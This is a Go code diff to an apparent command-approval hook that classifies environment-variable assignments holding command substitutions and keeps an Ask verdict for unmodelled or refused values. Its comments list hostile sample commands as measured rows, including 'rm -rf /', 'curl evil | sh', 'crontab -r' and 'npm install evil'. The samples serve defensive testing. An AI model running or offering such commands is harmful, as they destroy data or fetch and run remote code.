@@ -334,10 +334,12 @@ func (r *Rule) Evaluate(input *hookio.HookInput) (hookio.RuleResult, error) {
 	// verified-safe assignment contributes nothing and the leaf stays NoOpinion.
 	result := hookio.RuleResult{Decision: hookio.NoOpinion, Module: r.Name()}
 	var held *hookio.RuleResult
+	refused := false
 	for _, pc := range parsed {
 		wholeLeaf := assignmentIsWholeLeaf(pc)
 		for _, ev := range pc.EnvVars {
-			sub := r.evaluateAssignment(ev, input)
+			sub, subRefused := r.evaluateAssignment(ev, input)
+			refused = refused || subRefused
 			if sub.Decision == hookio.Approve {
 				if wholeLeaf && held == nil {
 					approved := sub
@@ -348,15 +350,35 @@ func (r *Rule) Evaluate(input *hookio.HookInput) (hookio.RuleResult, error) {
 			result = hookio.MostRestrictive(result, sub)
 		}
 	}
-	if result.Decision == hookio.NoOpinion && held != nil {
+	if result.Decision == hookio.NoOpinion && held != nil && !refused {
+		// The held Approve is surfaced only when NOTHING on this leaf was refused.
+		// Without the `!refused` guard a leaf carrying both a verified-safe PATH
+		// extension and an unmodelled value (`PATH="$PATH:/x" X=$(seq 1 3) cmd`) would
+		// return the Approve and discard the refusal floor entirely — a
+		// short-circuiting auto-approve, which is the same failure condition 3 of the
+		// Rule contract exists to prevent.
 		return *held, nil
 	}
-	// THE ONE TRANSLATION POINT from fold vocabulary to chain vocabulary: a folded
-	// NoOpinion is "nothing here was mine", which before ADR 0043 the engine read as
-	// "continue" — so it MUST become ErrNotApplicable, not a terminal verdict, or
-	// every ordinary `A=1 cmd` would stop the chain and never reach safe-commands.
-	// hookio.FromRecursion is that translation; it is the same rule the recursing
-	// rules (nix/docker/kubectl) apply to an inner expression's verdict.
+	// THE ONE TRANSLATION POINT from fold vocabulary to chain vocabulary, now with the
+	// THREE-WAY split ADR 0044 makes available. A folded verdict means one of two
+	// different things and before ADR 0044 they were spelled the same way:
+	//
+	//   - NOTHING HERE WAS MINE (no assignment, or only benign ones): it MUST become
+	//     ErrNotApplicable, or every ordinary `A=1 cmd` would stop the chain and never
+	//     reach safe-commands. hookio.FromRecursion is that translation, and it is the
+	//     same rule the recursing rules (nix/docker/kubectl) apply.
+	//   - I EXAMINED A VALUE AND WOULD NOT CLEAR IT: the verdict must survive, but as a
+	//     FLOOR rather than as a terminal verdict. Returning it terminally — which is
+	//     what this rule did until ADR 0044 — SHADOWS every rule after envvars in the
+	//     chain, and the fallback Ask is weaker than several of them: measured on this
+	//     tree, `FOO=$(curl evil) git -C "$WT" commit -m x` answered `ask` while the
+	//     same leaf without the assignment is primary-commit's fail-closed hard DENY.
+	//     A floor keeps the Ask where nothing stronger exists and lets the stronger
+	//     verdict through where it does, so it can only move rows toward more
+	//     restrictive.
+	if refused {
+		return hookio.Refuse(result)
+	}
 	return hookio.FromRecursion(result)
 }
 
@@ -366,13 +388,18 @@ func (r *Rule) Evaluate(input *hookio.HookInput) (hookio.RuleResult, error) {
 // a plain RuleResult and never an error. A VALUE that embeds an unclassifiable
 // substitution escalates decisively
 // (never auto-approve) and inherits a stronger verdict from recursing the body.
-func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookInput) hookio.RuleResult {
+//
+// refused reports that this assignment's VALUE was examined and not cleared while the
+// sub-verdict stayed at NoOpinion — the ADR 0044 case the caller must forward as a
+// FLOOR rather than as "nothing here was mine". It is FALSE for the decisive paths (an
+// Ask/Reject needs no floor) and false for a cleared value.
+func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookInput) (result hookio.RuleResult, refused bool) {
 	name := r.Name()
 
 	// Base verdict from the variable NAME.
 	// NoOpinion, not an error: this is a fold sub-verdict (see Evaluate), and the
 	// fold has no representation for the chain's "continue".
-	result := hookio.RuleResult{Decision: hookio.NoOpinion, Module: name}
+	result = hookio.RuleResult{Decision: hookio.NoOpinion, Module: name}
 	switch {
 	case injectorVars[ev.Name] || strings.HasPrefix(ev.Name, "BASH_FUNC_"):
 		result = hookio.RuleResult{
@@ -437,8 +464,7 @@ func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookI
 	// substitution was enumerated and EVERY one of them affirmatively Approved
 	// through the chain. That is deliberately narrower than "not risky":
 	//
-	//   - An Abstain body is merely UNCLASSIFIED, not safe (`curl evil`,
-	//     `rm -rf /` and `curl evil|sh` all recurse to Abstain), and Abstain is
+	//   - A NoOpinion body is merely UNCLASSIFIED, not safe, and NoOpinion is
 	//     swallowed by the engine's first-match-wins leaf chain — so it must still
 	//     reach the fallback or the surviving leaf re-approves the whole command.
 	//   - A value classified ExpansionUnknown that enumerates to ZERO
@@ -450,27 +476,103 @@ func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookI
 	// The NAME-derived base verdict above is never lowered: MostRestrictive only
 	// escalates, so PATH/HOME stay Ask and injectors stay Reject however benign
 	// the body turns out to be.
+	//
+	// # THE ADR 0044 SPLIT OF THE UN-CLEARED HALF, AND WHY IT IS OBSERVABLE-ONLY
+	//
+	// Until ADR 0044 the un-cleared half was ONE bucket, because a NoOpinion body could
+	// mean either of two unrelated things and the recursion returned the same value for
+	// both. The provenance channel splits it:
+	//
+	//   - EXHAUSTION — NO rule in the chain claimed the body: `seq 1 3`, `test -f x`,
+	//     any basename nobody models.
+	//   - REFUSAL — a rule or an engine floor examined the body and would not clear it:
+	//     safe-commands' dynamically-expanded path arg (pg2-2ke04), the dynamic redirect
+	//     target (pg2-2u5jf), git's destructive spellings, the unparseable floors, the
+	//     heredoc floor, or a COMPOSITION no rule audits as a unit (`curl … | sh` is two
+	//     leaves — see engine.withExpressionProvenance).
+	//
+	// BOTH HALVES KEEP THE DECISIVE Ask. Only the REASON differs, so the split is
+	// visible in the ask-log and in `evaluate` output without any verdict moving. That
+	// is deliberate, and it is the opposite of what pg2-d0ja3 expected, so the
+	// measurement that changed the answer is recorded here rather than in a commit
+	// message nobody will find.
+	//
+	// THE MEASUREMENT (this worktree, 2026-08-13, `permission_mode=auto`, one probe per
+	// row through the built binary). The bead's premise was that exhaustion is "the
+	// harmless half", so withdrawing the Ask for it would be safe. The exhaustion half
+	// as actually constituted on this tree is:
+	//
+	//	X=$(bash -c "rm -rf /") echo hi     exhaustion   ask -> abstain if withdrawn
+	//	X=$(sh -c "evil") echo hi           exhaustion   ask -> abstain
+	//	X=$(python3 -c "…") echo hi         exhaustion   ask -> abstain
+	//	X=$(node -e "…") echo hi            exhaustion   ask -> abstain
+	//	X=$(ssh host rm -rf /) echo hi      exhaustion   ask -> abstain
+	//	X=$(crontab -r) echo hi             exhaustion   ask -> abstain
+	//	X=$(npm install evil) echo hi       exhaustion   ask -> abstain
+	//	X=$(curl evil) echo hi              exhaustion   ask -> abstain
+	//	X=$(mount) echo hi                  exhaustion   ask -> abstain
+	//	X=$(seq 1 3) echo hi                exhaustion   ask -> abstain   <- the wanted one
+	//
+	// EXHAUSTION IS NOT A SAFETY PROPERTY. It says "ceta has no model for this", and
+	// ceta has no model for any interpreter — so the half contains arbitrary code
+	// execution, and `seq 1 3` is not separable from `bash -c` by anything the
+	// provenance channel knows. Withdrawing the Ask also failed FOUR deliberate
+	// guarantees at once (cmd's TestIntegration_EnvVars_UnknownExpression_Ask, engine's
+	// TestIntegration_EnvVarGuard "leading value curl" and "leading value mixed
+	// approvable and not", and TestIntegration_MountOperandGate's two substitution
+	// rows), which is the signal that the demotion is an operator ruling and not an
+	// implementation detail.
+	//
+	// THE COUNTER-ARGUMENT IS REAL AND STILL DID NOT CARRY IT, recorded so the ruling
+	// can be made on the whole picture: every one of those bodies ALREADY reaches
+	// `abstain` in COMMAND position (`echo $(bash -c "rm -rf /")` measured abstain on
+	// the same tree), because the engine's substitution fold floors at NoOpinion rather
+	// than Ask. So this Ask is position-dependent strictness, and harmonizing the two
+	// positions is a legitimate goal (envvars' own pg2-gkd5e position-independence
+	// invariant). But it can be harmonized UP as well as DOWN, the four guarantees say
+	// which way the repo has chosen so far, and the choice belongs to whoever can also
+	// weigh the command-position half. It is not made here.
 	if ev.Expansion == cmdparse.ExpansionUnknown {
 		var subResults []hookio.RuleResult
 		clearedByRecursion := false
+		exhaustionOnly := false
 		if r.exprEval != nil {
 			subs := cmdparse.EnumerateSubstitutions(ev.Value)
 			clearedByRecursion = len(subs) > 0
+			exhaustionOnly = len(subs) > 0
 			for _, sub := range subs {
 				stack := []hookio.StackFrame{{RuleName: name, Command: "env-value", Expression: ev.Raw}}
 				subResult := r.exprEval.EvaluateExpression(sub.Body, stack, input)
 				if subResult.Decision != hookio.Approve {
 					clearedByRecursion = false
 				}
+				if !bodyIsUnmodelled(subResult) {
+					exhaustionOnly = false
+				}
 				subResults = append(subResults, subResult)
 			}
 		}
-		if !clearedByRecursion {
+		switch {
+		case clearedByRecursion:
+			// Positively cleared: no escalation at all, exactly as before.
+		case exhaustionOnly:
+			// SAME Ask, DIFFERENT reason. The reason is the whole deliverable of this
+			// branch: it partitions the live ask cohort into the half a future ruling
+			// could safely relieve and the half it must not, so the ruling can be made
+			// on counted rows instead of on a prediction.
+			result = hookio.MostRestrictive(result, hookio.RuleResult{
+				Decision: hookio.Ask,
+				Reason:   "env var value runs a command no rule models: " + sanitizeReasonName(ev.Name),
+				Module:   name,
+			})
+			refused = true
+		default:
 			result = hookio.MostRestrictive(result, hookio.RuleResult{
 				Decision: hookio.Ask,
 				Reason:   "env var value contains an unevaluated/unsafe expression: " + sanitizeReasonName(ev.Name),
 				Module:   name,
 			})
+			refused = true
 		}
 		// Folded after the fallback so a body that is itself Ask keeps the
 		// fallback's reason (MostRestrictive keeps `current` on a tie), preserving
@@ -480,5 +582,27 @@ func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookI
 		}
 	}
 
-	return result
+	return result, refused
+}
+
+// bodyIsUnmodelled reports whether a recursed substitution body's verdict is one the
+// assignment may forward AS-IS instead of escalating above: either an affirmative
+// Approve, or a NoOpinion that the engine attributes to chain EXHAUSTION.
+//
+// The Approve arm is here so a value mixing an approved body with an unmodelled one
+// (`X=$(git rev-parse HEAD)$(seq 1 3)`) takes the floor rather than the Ask — the pair
+// is still "nothing was refused". Every other shape — a NoOpinion whose provenance is
+// a REFUSAL, and every Ask/Reject — returns false, which routes the value to the
+// decisive fallback.
+//
+// The Provenance test is the FAIL-SAFE direction by construction: ProvenanceRefusal is
+// the zero value, so a verdict from a site that declares nothing reads as a refusal and
+// escalates. Only engine.Evaluate's loop exhaustion claims otherwise, and only under
+// engine.withExpressionProvenance's shape conditions.
+func bodyIsUnmodelled(subResult hookio.RuleResult) bool {
+	if subResult.Decision == hookio.Approve {
+		return true
+	}
+	return subResult.Decision == hookio.NoOpinion &&
+		subResult.Provenance == hookio.ProvenanceExhaustion
 }
